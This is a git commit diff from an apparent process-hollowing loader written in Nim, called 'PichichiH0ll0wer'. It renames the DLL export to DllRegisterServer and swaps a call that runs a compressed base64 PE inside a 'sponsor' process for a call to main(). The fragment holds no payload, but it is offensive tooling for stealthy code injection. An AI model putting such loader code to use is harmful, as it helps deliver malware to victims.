0ac1597ae23360ab6384397692b1dc796d148cfb
Itay Migdal <itaymigdal9@gmail.com>
2023-04-17 20:31:02 +0300

    now dll is compiling, also resolved a bug

--- PichichiH0ll0wer/Loader/dll.nim
+++ PichichiH0ll0wer/Loader/dll.nim
@@ -3,11 +3,7 @@ import params
 
 proc NimMain() {.cdecl, importc.}
 
-proc DLL_EXPORT_NAME() : void {.stdcall, exportc, dynlib.} =
+proc DllRegisterServer(): void {.stdcall, exportc, dynlib.} =
     NimMain()
-    # Execute
-    discard execute(
-        compressedBase64PE = compressedBase64PE, 
-        sponsorCmd = sponsorPath & sponsorParams,
-        sleepSeconds = sleepSeconds
-    )
+    main()
+        
